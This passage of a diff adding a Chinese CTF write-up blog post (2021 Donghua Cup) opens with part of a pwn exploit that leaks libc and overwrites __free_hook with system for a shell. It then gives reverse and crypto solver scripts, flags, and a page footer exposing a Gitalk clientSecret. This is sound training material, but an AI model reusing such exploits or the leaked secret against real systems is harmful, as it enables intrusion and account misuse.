aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;
+	b=a;
+	a=&quot;bbbbbb&quot;;
+	c=0;
+	prints(b);
+	array arr[20];
+	arr[0]=1193046;
+	arr[1]=1193046;
+	b=&quot;asdasd&quot;;
+	a1=&quot;cccccccc&quot;;
+	a2=&quot;cccccccc&quot;;
+	a3=&quot;cccccccc&quot;;
+	a3=&quot;cccccccc&quot;;
+	a4=&quot;cccccccc&quot;;
+	a5=&quot;cccccccc&quot;;
+	a9=&quot;cccccccc&quot;;
+	tc=&quot;sssssssssssssssssssssssssssssssssssssssssssssssss&quot;;
+	a6=&quot;sssssssssssssssssssssssssssssssssssssssssssssssss&quot;;
+	a7=&quot;/bin/sh&quot;;
+	a8=&quot;/bin/sh&quot;;
+	a6=&quot;ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss&quot;;
+	tc=&quot;ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss&quot;;
+	prints(&quot;dddddd&quot;);
+	inputn(c);
+	arr[0]=c;
+	arr[1]=c;
+	tc1=&quot;sssssssssssssssssssssssssssssssssssssssssssssssss&quot;;
+	array arr1[1];
+	prints(&quot;dddddd&quot;);
+	inputn(c);
+	arr1[0]=c;
+	a7=&quot;aaa&quot;;
+	inputn(c);
+    &quot;&quot;&quot;
+
+	shell(payload)
+	libc_base=u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b'\x00'))-0x1ebbe0
+	libc=ELF('./libc.so.6',checksec = 0)
+	success(&quot;libc_base&quot;+hex(libc_base))
+
+	free_hook=libc_base+libc.sym['__free_hook']
+	system=libc_base+libc.sym['system']
+	success(&quot;free_hook:&quot;+hex(free_hook))
+	success(&quot;system:&quot;+hex(system))
+
+	#fuck the free_hook to the system
+	io.sendlineafter(&quot;dddddd\n&quot;,str(free_hook-0x28))
+	io.sendlineafter(&quot;dddddd\n&quot;,str(system))
+
+	io.interactive()
+
+if __name__ == '__main__':
+	main()
+</code></pre>
+<figure data-type="image" tabindex="25"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/ddee2fc283a5a.png" alt="1635690516069.png" loading="lazy"></figure>
+<p>flag为：</p>
+<pre><code>flag{35f2d3a9-bddc-9ffe-e8f7-ab999010b196}
+</code></pre>
+<h1 id="reverse">Reverse</h1>
+<h2 id="ooo">ooo</h2>
+<p>送分题，就是做慢了，呜呜呜</p>
+<figure data-type="image" tabindex="26"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/2f8700928ddf2.png" alt="1635681287859.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="27"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/ef2e25404137e.png" alt="1635681329257.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="28"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/5f89cb3b703e0.png" alt="1635681357794.png" loading="lazy"></figure>
+<p>照着搞就行了，一如既往，偷懒，暴力跑</p>
+<figure data-type="image" tabindex="29"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/d52f9a0966cad.png" alt="1635681395786.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="30"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/0d277f43bddb1.png" alt="1635681423884.png" loading="lazy"></figure>
+<p>flag为:</p>
+<pre><code>flag{13f35663-50a4-477b-278b-b711026ff7ad}
+</code></pre>
+<h2 id="mod">mod</h2>
+<p>这道题关键是花指令的去除,偷偷懒，只去除算法段，丢IDA F5</p>
+<figure data-type="image" tabindex="31"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/591a91b0ebde8.png" alt="1635682158947.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="32"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/c200d7dba41e0.png" alt="1635682223058.png" loading="lazy"></figure>
+<p>好了，base魔改，懒得分析算法,直接暴力跑</p>
+<figure data-type="image" tabindex="33"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/f719da302c955.png" alt="1635682251275.png" loading="lazy"></figure>
+<p>flag:</p>
+<pre><code>flag{5a073724-8223-413d-11fa-d53b133df89e}
+</code></pre>
+<h2 id="hells-gate">Hell's Gate</h2>
+<p>刚开始拿到这题，看到了很多个0x100感觉是RC4，就很激动（秒了,秒了）,根据习惯，我还是先爆破，再来分析算法,单步到如下图的时候，发现这里一直指针异常，说明有异常处理之类的东西，然后果然。。。。</p>
+<figure data-type="image" tabindex="34"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/2e94769e4299b.png" alt="1635682847311.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="35"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/00814a2f06677.png" alt="1635682888975.png" loading="lazy"></figure>
+<p>跟到00416F90函数，上面有部分貌似是反调试（反正没检测到我OD，估计是检测windbg之类的），能处理就处理吧，不过多阐述。找到算法段，发现了些奇奇怪怪的东西，类似于下图还有很多种这个代码。</p>
+<figure data-type="image" tabindex="36"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/7f9bffe616660.png" alt="1635682913571.png" loading="lazy"></figure>
+<p>Retf顾名思义，能给cs寄存器赋值，而cs寄存器为23的时候代表是32位汇编模式，33的时候则是64汇编模式，所以下面的汇编代码是64位的，windbg貌似也不能调试起来（也懒得找原因，好像是异常）因为每个64位汇编call代码量普遍不多，我就用CE去看汇编代码，逐个分析功能，如下图，就是个指针赋值call，经过一段时间分析，发现是tea算法</p>
+<figure data-type="image" tabindex="37"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/58ea78ce7759c.png" alt="1635682948489.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="38"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/877d17e8d42e3.png" alt="1635682965929.png" loading="lazy"></figure>
+<p>脚本如下：</p>
+<figure data-type="image" tabindex="39"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/003661ecd8af0.png" alt="1635683012029.png" loading="lazy"></figure>
+<p>flag为：</p>
+<pre><code>flag{0f4d0db3-668d-d58c-abb9-eb409657eaa8}
+</code></pre>
+<h2 id="hello">hello</h2>
+<p>调用JNI</p>
+<figure data-type="image" tabindex="40"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/7f1ea1630509a.png" alt="1635689380676.png" loading="lazy"></figure>
+<p>String2 可以用log找到</p>
+<figure data-type="image" tabindex="41"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/5e56db1184d6e.png" alt="1635689442372.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="42"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/750ca451b4ee1.png" alt="1635689463170.png" loading="lazy"></figure>
+<p>So代码</p>
+<figure data-type="image" tabindex="43"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/a153dd03e1e92.png" alt="1635689500277.png" loading="lazy"></figure>
+<p>脚本如下：</p>
+<pre><code class="language-python">raw_sign = '308202e4308201cc020101300d06092a864886f70d010105050030373116301406035504030c0d416e64726f69642044656275673110300e060355040a0c07416e64726f6964310b30090603550406130255533020170d3231303330363134333034385a180f32303531303232373134333034385a30373116301406035504030c0d416e64726f69642044656275673110300e060355040a0c07416e64726f6964310b300906035504061302555330820122300d06092a864886f70d01010105000382010f003082010a0282010100cbf2b09e4308ebb459e8841e5a7b920497fef2b349e80648f7eb35f48d40a75e7ce7945b8b42d197bec0bf177e6c9899ed707dcc4a726cb14c1a69b0c4a02474806fa73cfb10e10f7b1665021c24762b6edad65ca63cea3c72e0d4e4ca3f98301173eec3254337af1f5a11f779ecbe04d1b74d53f5835e011222155a56f97e00d75374cd93080dfa087cd356a99fe1eebf5d6d5e31846aad5252c3a17a4656e2e210ce1c7aa4d147fb8cf440a50add61bbb2ec299a2e0dab0b4504796ac3a899da553ab1d83576691ab23409d18398014b3b5eaf12e83f4d99aa09e1e4e4cae133530730c1133da2b3dee37b58eb1a5795b221ec5a8830731a41167d295f9e1b0203010001300d06092a864886f70d010105050003820101000e4740235e9cf2be33de3e06d777139cbbc5cf0622285c17da04697b8067318aaf8df0fbb4d3166f293ea15aa2592f06eb6929af063722ac9f30ad85e2c087564931d6ac65fcd5fbc864b3dc9841e039c6e1d5fbc5c2f8adf90a547bc4ebc07d387914db24451c2cc89925359bd3bb0750c7aabf9d743b1893e98bbc8ff74b24fc0b4be2dbaaf1c917bba01496d0617ffc3a4a8b7a6e79a3036298a6ebf57bb00001e43a0b242864eebb0fcec9e323144d4447c878430f18e6e358ad97566fa04d1f07b171c1476c9af5a1eba0bf6616e219c0b9e1299d09fecded24a880397f92e0f99d8951228c7770c184fd77adff943bfc8b6aa524c5f0a6d7686fe35486'
+enc = [0xCA, 0xEB, 0x4A, 0x8A, 0x68, 0xE1, 0xA1, 0xEB, 0xE1, 0xEE,
+	   0x6B, 0x84, 0xA2, 0x6D, 0x49, 0xC8, 0x8E, 0x0E, 0xCC, 0xE9,
+	   0x45, 0xCF, 0x23, 0xCC, 0xC5, 0x4C, 0x0C, 0x85, 0xCF, 0xA9,
+	   0x8C, 0xF6, 0xE6, 0xD6, 0x26, 0x6D, 0xAC, 0x0C, 0xAC, 0x77,
+	   0xE0, 0x64]
+
+for i in range(0, 42):
+	enc[i] = (enc[i] &lt;&lt; 3 &amp; 0xff) + (enc[i] &gt;&gt; 5 &amp; 0xff)
+flag = &quot;&quot;
+for i in range(len(enc)):
+	index = i * 27 + 327
+	magic = ord(raw_sign[index]) + i
+	flag += chr(magic ^ enc[i])
+print flag
+</code></pre>
+<figure data-type="image" tabindex="44"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/62e402b2cc6a0.png" alt="1635689916263.png" loading="lazy"></figure>
+<p>flag为：</p>
+<pre><code>flag{d5577edd-8211-7a0e-f23a-305b0b10683f}
+</code></pre>
+<h1 id="crypto">Crypto</h1>
+<h2 id="blockencrypt">BlockEncrypt</h2>
+<p>反编译，得到不完整的加密函数，可以发现是aes，然后解密</p>
+<p>脚本如下：</p>
+<pre><code class="language-python">from pwn import *
+import hashlib
+import string
+
+
+s=&quot;flag{abcdef0123456789-}&quot;
+
+def f(a,b):
+	m=[]
+	for i in range(10):
+		m.append(str(i))
+	for i in range(26):
+		m.append(chr(i+0x41))
+		m.append(chr(i+0x61))
+	for i in m:
+		for j in m:
+			for k in m:
+				for p in m:
+					t=i+j+k+p+a
+					if(hashlib.sha256(t.encode()).hexdigest()==b):
+						print(&quot;find&quot;)
+						return t[:4]
+
+
+sh=remote(&quot;47.104.183.8&quot;,&quot;47971&quot;)
+sh.recvuntil(b&quot;X+&quot;)
+a=(sh.recvuntil(b&quot;)&quot;,drop=True).decode())
+
+sh.recvuntil(b&quot;== &quot;)
+b=(sh.recvuntil(b&quot;\n&quot;,drop=True).decode())
+sh.send(f(a,b).encode())
+sh.recv()
+print(sh.recv().decode())
+
+sh.send(b'1')
+sh.recv()
+sh.recvuntil(b&quot;\n&quot;,drop=True)
+flag=(sh.recvuntil(b&quot;\n[+]&quot;,drop=True))
+print()
+
+t=0
+r=&quot;&quot;
+while 1:
+	for i in s:
+		m=r+i
+		m=m.encode()
+		sh.send(b'2')
+		sh.send(m)
+		sh.recv()
+		sh.recv()
+		sh.recvuntil(b&quot;CipherText:&quot;,drop=True)
+		c=(sh.recvuntil(b&quot;\n[+]&quot;,drop=True))
+		if(c[t]==flag[t]):
+			r=r+i
+			t+=1
+			print(r)
+
+</code></pre>
+<figure data-type="image" tabindex="45"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/48290e2da701c.png" alt="1635690908280.png" loading="lazy"></figure>
+<p>flag为：</p>
+<pre><code>flag{ad7e9276-de18-52b8-8c1c-3db559274f2d}
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#2021%E5%B9%B4%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B%E6%9A%A8%E7%AC%AC%E4%B8%83%E5%B1%8A%E4%B8%9C%E5%8D%8E%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bwriteup">2021年全国大学生网络安全邀请赛暨第七届&quot;东华杯&quot;上海市大学生网络安全大赛Writeup</a></li>
+<li><a href="#misc">Misc</a>
+<ul>
+<li><a href="#checkin">checkin</a></li>
+<li><a href="#project">project</a></li>
+<li><a href="#jumpjumptiger">JumpJumpTiger</a></li>
+</ul>
+</li>
+<li><a href="#web">Web</a>
+<ul>
+<li><a href="#apacheproxy">apacheprOxy</a></li>
+<li><a href="#ezgadget">EzGadget</a></li>
+</ul>
+</li>
+<li><a href="#pwn">Pwn</a>
+<ul>
+<li><a href="#cpp1">cpp1</a></li>
+<li><a href="#bg3">bg3</a></li>
+<li><a href="#gcc2">gcc2</a></li>
+<li><a href="#boom_script">boom_script</a></li>
+</ul>
+</li>
+<li><a href="#reverse">Reverse</a>
+<ul>
+<li><a href="#ooo">ooo</a></li>
+<li><a href="#mod">mod</a></li>
+<li><a href="#hells-gate">Hell's Gate</a></li>
+<li><a href="#hello">hello</a></li>
+</ul>
+</li>
+<li><a href="#crypto">Crypto</a>
+<ul>
+<li><a href="#blockencrypt">BlockEncrypt</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/2021年“绿盟杯”重庆市大学生信息安全竞赛—Light1ng战队Writeup/">
+              <h3 class="post-title">
+                2021年“绿盟杯”重庆市大学生信息安全竞赛—Light1ng战队Writeup
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
